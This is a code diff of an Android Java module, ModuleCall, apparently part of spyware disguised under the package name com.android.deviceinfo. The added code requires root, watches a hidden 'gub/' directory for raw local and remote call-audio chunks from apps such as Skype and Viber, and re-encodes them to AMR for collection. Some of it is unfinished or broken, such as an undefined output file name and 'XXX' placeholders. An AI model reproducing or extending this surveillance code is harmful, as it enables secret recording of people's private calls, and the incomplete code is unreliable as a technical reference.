@@ -9,21 +9,33 @@
 
 package com.android.deviceinfo.module;
 
-import ArrayList;
-import FileObserver;
-
+import java.io.BufferedInputStream;
+import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.FilenameFilter;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+import java.util.ArrayList;
 import java.util.Collections;
-import java.util.Comparator;
 import java.util.Date;
 import java.util.HashMap;
+import java.util.Iterator;
 import java.util.List;
+import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.BlockingQueue;
 
+import android.media.AmrInputStream;
 import android.media.MediaRecorder;
 import android.os.Build;
+import android.os.FileObserver;
 
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.Device;
@@ -42,8 +54,8 @@ import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
+import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
-import com.android.m.M;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
@@ -64,10 +76,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final int AUDIO_STREAM_SYSTEM     = 1;
 	private static final int AUDIO_STREAM_RING       = 2;
 	private static final int AUDIO_STREAM_MUSIC      = 3;
-	
+	private static final int AUDIO_STREAM_MIC		 = -2; // Defined by us, not by Android
+
 	private String audioStorage;
 	private FileObserver observer;
-	
+	private Thread queueMonitor;
+	private static final Object sync = new Object();
+	private static BlockingQueue<String> calls;
+
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
 
@@ -104,31 +120,157 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
 			}
 		}
-		
-		// XXX
-		Thread mythread = new Thread(runnable);
-	    mythread.start();
+
+		// Start monitoring the filesystem
+		if (Status.haveRoot() && createAudioStorage() == true) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): starting audio storage management");
+			}
+			
+			calls = new LinkedBlockingQueue<String>(); 
+			
+			// Scrub for existing files on FS
+			File f = new File(this.audioStorage);
+			
+			FilenameFilter filter = new FilenameFilter() {
+			    public boolean accept(File dir, String name) {
+			        return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".tmp"));
+			    }
+			};
+			
+			File file[] = f.listFiles(filter);
+
+			// Che palle Java!
+			List<File> filesList = new java.util.ArrayList<File>();	
+			filesList.addAll(java.util.Arrays.asList(file));
+			java.util.Collections.sort(filesList);
+			
+			// Adding scrubbed files
+			for (File storedFile : filesList) {
+				String fullName = storedFile.getAbsolutePath();
+				
+				addToEncodingList(fullName);
+			}
+			
+			// Start the monitor and encoding thread
+			queueMonitor = new Thread(new EncodingTask(sync, calls));
+			queueMonitor.start();
+			
+			// Give it time to spawn before signaling
+			Utils.sleep(500);
+			
+			while (queueMonitor.isAlive() == false) {
+				Utils.sleep(250);
+			}
+			
+			// Tell the thread to process scrubbed files
+			synchronized(sync) {
+				sync.notify();
+			}
+
+			// Observe our audio storage
+			observer = new FileObserver(audioStorage) {
+				@Override
+				public void onEvent(int event, String file) {
+					// Add to list
+					if (addToEncodingList(file) == true) {
+						synchronized(sync) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "(onEvent): signaling EncodingTask thread");
+							}
+							
+							sync.notify();
+						}
+					}
+				}
+			};
+
+			observer.startWatching();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): cannot create audio storage");
+			}
+		}
+	}
+
+	class EncodingTask implements Runnable {
+	    Object sync;
+	    BlockingQueue<String> queue;
 	    
-	    observer = new FileObserver(pathToWatch) { // set up a file observer to watch this directory on sd card
-
-	        @Override
-	        public void onEvent(int event, String file) {
-	            //if(event == FileObserver.CREATE && !file.equals(".probe")){ // check if its a "create" and not equal to .probe because thats created every time camera is launched
-	            Log.d(TAG, "File created [" + pathToWatch + file + "]");
-
-	            Toast.makeText(getBaseContext(), file + " was saved!", Toast.LENGTH_LONG);
-	            //}
+	    EncodingTask(Object t, BlockingQueue<String> l) {
+	    	sync = t;
+	    	queue = l;
+	    }
+	    
+	    public void run() {
+	        while(true) {
+	            synchronized (sync) {
+	                try {
+	                	sync.wait();
+	                } catch (InterruptedException e) {
+						if (Cfg.EXCEPTION) {
+							Check.log(e);
+						}
+	                }
+	            }
+	            
+	            if (Cfg.DEBUG) {
+					Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
+				}
+	            
+	            // Browse lists and check if an encoding is already in progress
+	            try {
+					String file = queue.take();
+					
+	            	// Check if end of conversation
+		            if (Cfg.DEBUG) {
+						Check.log(TAG + "(EncodingTask run): decoding " + file);
+					}
+		            
+		            encodeChunks(file);
+	            		
+	            	// Encode
+		            //encodeAudio(data);
+				} catch (Exception e) {
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
+					}
+				}
 	        }
-	    };
-	    observer.startWatching(); //START OBSERVING 
+	    }
+	}
+
+	synchronized private boolean addToEncodingList(String s) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
+		}
+		
+		if (s.contains("Qi-") == false || (s.endsWith("-l.tmp") == false && s.endsWith("-r.tmp") == false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us, probably a temporary file");
+			}
+			
+			return false;
+		}
+		
+		// Add the file to the list	
+		calls.add(s);
+		
+		return true;
 	}
 
 	@Override
 	public void actualStop() {
 		ListenerCall.self().detach(this);
+
+		// XXXXX
+		if (Status.haveRoot()) {
+			queueMonitor.destroy();
+			observer.stopWatching();
+		}
 	}
 
-	public int notification(final Call call) {
+    public int notification(final Call call) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
 		}
@@ -290,7 +432,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			return false;
 		}
 	}
-
+	
 	private int checkIntegrity(byte[] data) {
 		int pos = 0;
 		int chunklen = 0;
@@ -356,7 +498,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		additionalData.write(caller);
 		additionalData.write(callee);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
 			Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition() , len);
@@ -671,164 +813,188 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			return string.length() * 2 + 4;
 		}
 	}
+
+	private void encodetoAmr(byte[] raw) {   
+	    InputStream inStream = new ByteArrayInputStream(raw);
+	    AmrInputStream aStream = new AmrInputStream(inStream);
 	
+	    File file = new File(amrFilename);        
+	    file.createNewFile();
+	    OutputStream out = new FileOutputStream(file); 
+	
+	    out.write(0x23);
+	    out.write(0x21);
+	    out.write(0x41);
+	    out.write(0x4D);
+	    out.write(0x52);
+	    out.write(0x0A);    
+	
+	    byte[] x = new byte[1024];
+	    int len;
+	    while ((len=aStream.read(x)) > 0) {
+	        out.write(x,0,len);
+	    }
+	
+	    out.close();
+	}
+
 	// start: call start date
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
-	private boolean decodeFiles(Date start, int sec_length, int type) {
-		int range = 50; // ms
-		
-		List<String> remote_audio = new java.util.ArrayList<String>();
-		List<String> local_audio = new java.util.ArrayList<String>();
+	private boolean encodeChunks(String f) throws IOException {
 		int end_of_call = 0xF00DF00D;
+		int epoch, streamType, sampleRate, blockLen;
+		int discard_frame_size = 8;
 		
-		if (this.audioStorage.length() == 0) {
+		// header format - each field is 4 bytes le :
+		// epoch : streamType : sampleRate : blockLen
+		File raw = new File(f);
+
+		FileInputStream in = null;
+
+		try {
+			in = new FileInputStream(raw);
+			
+			byte data[] = new byte[(int)raw.length()];
+			in.read(data, 0, (int)raw.length());
+			
+			ByteBuffer d = ByteBuffer.wrap(data);
+			d.order(ByteOrder.LITTLE_ENDIAN);
+			
+			data = null;
+			
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(decodeFile): creating audio storage");
+				Check.log(TAG + "(encodeChunks): Parsing " + f);
 			}
 			
-			if (createAudioStorage() == false) {
-				return false;
-			}
-		}
-		
-		// List captured files
-		File f = new File(this.audioStorage);
-		File file[] = f.listFiles();
-		
-		// Che palle Java!
-		List<File> filesList = new java.util.ArrayList<File>();
-		filesList.addAll(java.util.Arrays.asList(file));
-		java.util.Collections.sort(filesList);
-		 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "(decodeFile) audio queue list length: " + file.length);
-		}
-		
-		start_millis = String.valueOf(start.getTime());
-		end_millis = start_millis + (sec_length * 1000);
-		
-		// Identify head and tail for both channels
-		int r_head, r_tail, l_head, l_tail;
-		 
-		// Formant name: Qi-<epoch time>-<unique id per call>-<channel>.tmp
-		// Channel is: l for local and r for remote
-		for (int i = 0; i < file.length; i++) {
-			String[] split = file[i].getName().split("-");
-			long file_millis = Long.parseLong(split[1]); // stored file epoch time
+			// Create destination file
+			// XXX
 			
-			// Remote audio
-			if (split[1].endsWith("r.tmp")) {
-				// Identify start chunk
-				if (file_millis >= start_millis && file_millis < start_millis + range) {
-					if (r_head.length() == 0) {
+			int data_size = 0;
+			
+			while (d.remaining() > 0) {
+				d.position(d.position() + 12); // Discard epoch, streamType, sampleRate
+				blockLen = d.getInt();
+
+				// Discarded bytes must be discarded in the next loop too
+				if (blockLen != discard_frame_size) {
+					data_size += d.getInt(); // Get blockLen
+				}
+				
+				d.position(d.position() + blockLen);
+			}
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(encodeChunks): raw dat size: " + data_size + " bytes");
+			}
+			
+			// Recover the last 4 bytes
+			d.position(d.position() - 4);
+			
+			if (d.getInt() == end_of_call) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(encodeChunks): end of call detected");
+				}
+				
+				// We don't want to encode the end of call
+				data_size -= 4;
+			}
+			
+			// Let's start again
+			d.rewind();
+			
+			byte[] rawPcm = new byte[data_size];
+			int pos = 0;
+			boolean call_finished = false;
+			
+			while (d.remaining() > 0) {
+				epoch = d.getInt();
+				streamType = d.getInt();
+				sampleRate = d.getInt();
+				blockLen = d.getInt();
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(encodeChunks): epoch: " + epoch + " streamType: " + streamType + " sampleRate: " + sampleRate + " blockLen: " + blockLen);
+				}
+				
+				if (blockLen == discard_frame_size) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
+					}
+					
+					d.position(d.position() + blockLen);
+					continue;
+				}
+				
+				if (blockLen == 4) {
+					int marker = d.getInt();
+					
+					if (marker == end_of_call) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our remote call start");
+							Check.log(TAG + "(encodeChunks): end of call reached for " + f);
 						}
 						
-						r_head = i;
+						call_finished = true;
+						
+						// Last frame (otherwise the file format is wrong)
+						d.position(d.position() + 4);
+						
+						if (d.remaining() > 0) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "(encodeChunks): ***WARNING*** end of call reached and still " + d.remaining() + " bytes remaining!");
+							}
+						}
+						
 						continue;
 					}
 				}
 				
-				// Identify end chunk
-				if (file_millis >= end_millis - range && file_millis <= end_millis) {
-					if (r_tail.length() == 0) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our remote call end");
-						}
-						
-						r_tail = i;
-						continue;
-					}
-				}
+				byte[] rawPcmBlock = new byte[blockLen];
+				d.get(rawPcmBlock);
+				
+				System.arraycopy(rawPcmBlock, 0, rawPcm, pos, rawPcmBlock.length);
+				pos += blockLen;
 			}
 			
-			// Local audio
-			if (split[1].endsWith("l.tmp")) {
-				// Identify start chunk
-				if (file_millis >= start_millis && file_millis < start_millis + range) {
-					if (l_head.length() == 0) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our local call start");
-						}
-						
-						l_head = i;
-						continue;
-					}
-				}
-				
-				// Identify end chunk
-				if (file_millis >= end_millis - range && file_millis <= end_millis) {
-					if (l_tail.length() == 0) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our local call end");
-						}
-						
-						l_tail = i;
-						continue;
-					}
-				}
+			// Now rawPcm contains the raw data
+			encodetoAmr(rawPcm);
+			
+			if (call_finished) {
+				// After encoding create the end of call marker
+			}
+		} finally {
+			if (in != null) {
+				in.close();
 			}
 		}
 		
-		// Populate both lists
-		for (int i = r_head; i <= r_tail; i++) {
-			if (file[i].getName().endsWith("r.tmp")) {
-				remote_audio.add(file[i].getName());
-			}
-		}
 		
-		for (int i = l_head; i <= l_tail; i++) {
-			if (file[i].getName().endsWith("l.tmp")) {
-				local_audio.add(file[i].getName());
-			}
-		}
-		
+		// Remove file
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "(decodeFile): Remote queue length: " + remote_audio.size() + " elements - Local queue length: " + local_audio.size() + " elements");
+			Check.log(TAG + "(encodeChunks): deleting " +  f);
 		}
 		
-		// We (hopefully) have both the lists
-        // header format - each field is 4 bytes le :
-        // epoch : streamType : sampleRate : blockLen
+		//raw.delete();
 		
-		
+		return true;
 	}
-	
+
 	private boolean createAudioStorage() {
 		// Create storage directory
 		this.audioStorage = Path.hidden() + "gub/";
-		
+
 		if (Path.createDirectory(this.audioStorage) == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (decodeFile): audio storage directory cannot be created"); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (decodeFile): audio storage directory created at " + this.audioStorage); //$NON-NLS-1$
 			}
-			
+
 			return true;
 		}
 	}
-	
-	Runnable callQueueMonitor = new Runnable() {
-		public void run() {
-
-			long endTime = System.currentTimeMillis() + 20*1000;
-
-			while (System.currentTimeMillis() < endTime) {
-				synchronized (this) {
-					try {
-						wait(endTime - System.currentTimeMillis());
-					} catch (Exception e) {}	
-				}
-
-			}
-		}
-	};
 }
-
